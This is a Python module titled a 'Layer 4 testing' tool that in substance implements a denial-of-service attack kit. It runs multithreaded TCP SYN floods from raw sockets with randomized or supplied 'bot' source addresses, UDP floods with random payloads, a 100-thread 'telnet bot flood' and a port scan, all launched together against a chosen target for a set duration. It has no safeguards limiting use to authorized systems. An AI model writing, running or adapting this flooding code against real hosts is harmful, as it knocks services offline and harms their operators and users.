#!/usr/bin/env python3
"""
Layer 4 (Transport Layer) Testing Module
Tests TCP and UDP protocols
"""

import socket
import threading
import time
import random
import struct
from colorama import Fore, Style

class Layer4Tester:
    def __init__(self, target, port, threads=10, duration=60, verbose=False, bot_ips=None):
        self.target = target
        self.port = port
        self.threads = threads
        self.duration = duration
        self.verbose = verbose
        self.running = False
        self.connections_attempted = 0
        self.successful_connections = 0
        self.failed_connections = 0
        self.bot_ips = bot_ips or []
        self.requests_per_bot = 6000
        
        # TCP flags
        self.tcp_flags = {
            'SYN': 0x02,
            'ACK': 0x10,
            'FIN': 0x01,
            'RST': 0x04,
            'PSH': 0x08,
            'URG': 0x20
        }

    def tcp_connect_test(self):
        """Test TCP connection establishment"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            
            result = sock.connect_ex((self.target, self.port))
            self.connections_attempted += 1
            
            if result == 0:
                self.successful_connections += 1
                if self.verbose:
                    print(f"{Fore.GREEN}[+] TCP connection successful to {self.target}:{self.port}{Style.RESET_ALL}")
                
                # Send some data
                try:
                    sock.send(b"GET / HTTP/1.1\r\nHost: " + self.target.encode() + b"\r\n\r\n")
                    response = sock.recv(1024)
                    if self.verbose and response:
                        print(f"{Fore.CYAN}[*] Response: {response[:100]}...{Style.RESET_ALL}")
                except:
                    pass
                    
                sock.close()
            else:
                self.failed_connections += 1
                if self.verbose:
                    print(f"{Fore.RED}[-] TCP connection failed to {self.target}:{self.port} (Error: {result}){Style.RESET_ALL}")
                    
        except Exception as e:
            self.connections_attempted += 1
            self.failed_connections += 1
            if self.verbose:
                print(f"{Fore.RED}[-] TCP connection error: {e}{Style.RESET_ALL}")

    def tcp_syn_flood(self, source_ip=None):
        """Simulate TCP SYN flood"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            if not source_ip:
                source_ip = f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"
            source_port = random.randint(1024, 65535)
            tcp_header = struct.pack('!HHLLBBHHH',
                source_port,
                self.port,
                random.randint(0, 0xFFFFFFFF),
                0,
                5 << 4,
                self.tcp_flags['SYN'],
                8192,
                0,
                0
            )
            sock.sendto(tcp_header, (self.target, 0))
            self.connections_attempted += 1
            if self.verbose:
                print(f"{Fore.YELLOW}[*] SYN packet sent from {source_ip}:{source_port} to {self.target}:{self.port}{Style.RESET_ALL}")
        except PermissionError:
            if self.verbose:
                print(f"{Fore.RED}[-] Raw socket requires administrator privileges{Style.RESET_ALL}")
        except Exception as e:
            if self.verbose:
                print(f"{Fore.RED}[-] SYN flood error: {e}{Style.RESET_ALL}")

    def udp_flood(self):
        """Perform UDP flood test"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            # Create random payload
            payload_size = random.randint(64, 1024)
            payload = random.randbytes(payload_size)
            
            # Send UDP packet
            sock.sendto(payload, (self.target, self.port))
            self.connections_attempted += 1
            
            if self.verbose:
                print(f"{Fore.YELLOW}[*] UDP packet sent ({payload_size} bytes) to {self.target}:{self.port}{Style.RESET_ALL}")
                
        except Exception as e:
            if self.verbose:
                print(f"{Fore.RED}[-] UDP flood error: {e}{Style.RESET_ALL}")

    def port_scan(self):
        """Perform port scanning"""
        common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 3306, 3389, 5432, 8080]
        
        for port in common_ports:
            if not self.running:
                break
                
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                
                result = sock.connect_ex((self.target, port))
                self.connections_attempted += 1
                
                if result == 0:
                    self.successful_connections += 1
                    if self.verbose:
                        print(f"{Fore.GREEN}[+] Port {port} is open{Style.RESET_ALL}")
                else:
                    self.failed_connections += 1
                    if self.verbose:
                        print(f"{Fore.RED}[-] Port {port} is closed{Style.RESET_ALL}")
                        
                sock.close()
                
            except Exception as e:
                self.connections_attempted += 1
                self.failed_connections += 1
                if self.verbose:
                    print(f"{Fore.RED}[-] Port {port} scan error: {e}{Style.RESET_ALL}")

    def tcp_worker(self):
        """TCP test worker thread"""
        while self.running:
            self.tcp_connect_test()

    def syn_flood_worker(self, source_ip=None):
        """SYN flood worker thread"""
        for _ in range(self.requests_per_bot):
            if not self.running:
                break
            self.tcp_syn_flood(source_ip)

    def udp_worker(self):
        """UDP flood worker thread"""
        while self.running:
            self.udp_flood()

    def port_scan_worker(self):
        """Port scan worker thread"""
        while self.running:
            self.port_scan()

    def telnet_flood(self, message="flood", telnet_threads=100):
        def telnet_worker():
            end_time = time.time() + self.duration
            while self.running and time.time() < end_time:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect((self.target, self.port))
                    sock.sendall(message.encode() * 100)
                    sock.close()
                except Exception as e:
                    if self.verbose:
                        print(f"{Fore.RED}[-] Telnet bot error: {e}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Starting Telnet bot flood against {self.target}:{self.port}{Style.RESET_ALL}")
        telnet_threads_list = []
        for _ in range(telnet_threads):
            t = threading.Thread(target=telnet_worker)
            t.daemon = True
            t.start()
            telnet_threads_list.append(t)
        for t in telnet_threads_list:
            t.join(timeout=1)

    def run_tests(self):
        """Run all Layer 4 tests"""
        print(f"{Fore.CYAN}[*] Starting Layer 4 tests against {self.target}:{self.port}{Style.RESET_ALL}")
        
        self.running = True
        start_time = time.time()
        
        # Start TCP connection test threads
        tcp_threads = []
        for i in range(self.threads // 2):
            source_ip = self.bot_ips[i % len(self.bot_ips)] if self.bot_ips else None
            thread = threading.Thread(target=self.syn_flood_worker, args=(source_ip,))
            thread.daemon = True
            thread.start()
            tcp_threads.append(thread)
        
        # Start SYN flood threads
        syn_threads = []
        for _ in range(min(3, self.threads // 4)):
            thread = threading.Thread(target=self.syn_flood_worker)
            thread.daemon = True
            thread.start()
            syn_threads.append(thread)
        
        # Start UDP flood threads
        udp_threads = []
        for _ in range(min(3, self.threads // 4)):
            thread = threading.Thread(target=self.udp_worker)
            thread.daemon = True
            thread.start()
            udp_threads.append(thread)
        
        # Start port scan thread
        scan_thread = threading.Thread(target=self.port_scan_worker)
        scan_thread.daemon = True
        scan_thread.start()
        
        # Start telnet bot threads
        self.telnet_flood(message="flood", telnet_threads=50)
        
        # Monitor progress
        try:
            while time.time() - start_time < self.duration:
                elapsed = time.time() - start_time
                remaining = self.duration - elapsed
                
                print(f"\r{Fore.YELLOW}[*] Progress: {elapsed:.1f}s/{self.duration}s | "
                      f"Attempts: {self.connections_attempted} | "
                      f"Success: {self.successful_connections} | "
                      f"Failed: {self.failed_connections} | "
                      f"Remaining: {remaining:.1f}s{Style.RESET_ALL}", end="")
                
                time.sleep(1)
                
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Test interrupted{Style.RESET_ALL}")
        
        # Stop all threads
        self.running = False
        
        # Wait for threads to finish
        all_threads = tcp_threads + syn_threads + udp_threads + [scan_thread]
        for thread in all_threads:
            thread.join(timeout=1)
        
        # Print final results
        print(f"\n{Fore.GREEN}[+] Layer 4 test completed{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Total connection attempts: {self.connections_attempted}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}Successful connections: {self.successful_connections}{Style.RESET_ALL}")
        print(f"{Fore.RED}Failed connections: {self.failed_connections}{Style.RESET_ALL}")
        
        if self.connections_attempted > 0:
            success_rate = (self.successful_connections / self.connections_attempted) * 100
            print(f"{Fore.YELLOW}Success rate: {success_rate:.1f}%{Style.RESET_ALL}") 